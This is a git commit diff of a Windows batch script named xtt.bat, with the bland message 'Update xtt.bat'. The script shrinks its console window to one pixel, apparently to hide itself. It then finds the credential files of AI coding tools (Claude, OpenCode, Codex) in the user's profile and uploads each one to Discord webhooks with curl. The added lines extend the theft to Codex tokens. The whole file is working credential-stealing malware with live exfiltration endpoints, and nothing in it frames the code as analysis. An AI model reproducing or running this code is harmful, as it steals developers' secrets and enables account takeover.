da6bd2dfa11cff8c3dbe3e10a5e677d62aaf872d
eidanexa-lang <eidanexa@gmail.com>
2026-06-03 18:13:00 -0500

    Update xtt.bat

--- xtt.bat
+++ xtt.bat
@@ -1,26 +1,26 @@
-powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
 @echo off
-set "FILEEE=%userprofile%\.claude\credentials.json"
-set "FILEE=%userprofile%\.claude\.credentials.json"
-set "FILE=%userprofile%\.local\share\opencode\auth.json"
-set "WEBHOOKA=https://discord.com/api/webhooks/1509347871974101152/KzKcfHkJXnUaZFDIIk0lceB7Rys8Hvj6V4V-38LUlhaMvX4IkIXCr2MfW-nqyMjBSh0K"
-set "WEBHOOK=https://discord.com/api/webhooks/1509356918148169920/Gl98LVlee9vJ6mM6ZOgfHFnen8ILV9mZs24bgvhSdQ2TsVqBlLKuSIwVqabMA3ztWcle"
-if exist "%FILE%" (
-curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
-json\n\"}" ^
-    %WEBHOOKA%
-curl -F "file=@%FILE%" %WEBHOOKA%
+powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
+set "ClaudeE=%userprofile%\.claude\credentials.json"
+set "ClaudeEE=%userprofile%\.claude\.credentials.json"
+set "OpenCodeE=%userprofile%\.local\share\opencode\auth.json"
+set "CodexE=%userprofile%\.codex\auth.json"
+set "OpenCode=https://discord.com/api/webhooks/1509347871974101152/KzKcfHkJXnUaZFDIIk0lceB7Rys8Hvj6V4V-38LUlhaMvX4IkIXCr2MfW-nqyMjBSh0K"
+set "Claude=https://discord.com/api/webhooks/1509356918148169920/Gl98LVlee9vJ6mM6ZOgfHFnen8ILV9mZs24bgvhSdQ2TsVqBlLKuSIwVqabMA3ztWcle"
+set "Codex=https://discord.com/api/webhooks/1509361226583638026/kUQ84E8sysn6X25dpr70TX7y7wOaCIPHMOxJaz6jPz0DEYFA5s6qVo5fVGaL_NhxATJt"
+if exist "%OpenCodeE%" (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"que elegancia\"}" %OpenCode%
+    curl -F "file=@%OpenCodeE%" %OpenCode%
 )
-if exist "%FILEE%" (
-curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
-json\n\"}" ^
-    %WEBHOOK%
-curl -F "file=@%FILEE%" %WEBHOOK%
+if exist "%ClaudeEE%" (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"chinche!\"}" %Claude%
+    curl -F "file=@%ClaudeEE%" %Claude%
 )
-if exist "%FILEEE%" (
-curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
-json\n\"}" ^
-    %WEBHOOK%
-curl -F "file=@%FILEEE%" %WEBHOOK%
+if exist "%ClaudeE%" (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Claude%
+    curl -F "file=@%ClaudeE%" %Claude%
+)
+if exist "%CodexE%" (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
+    curl -F "file=@%CodexE%" %Codex%
 )
 exit
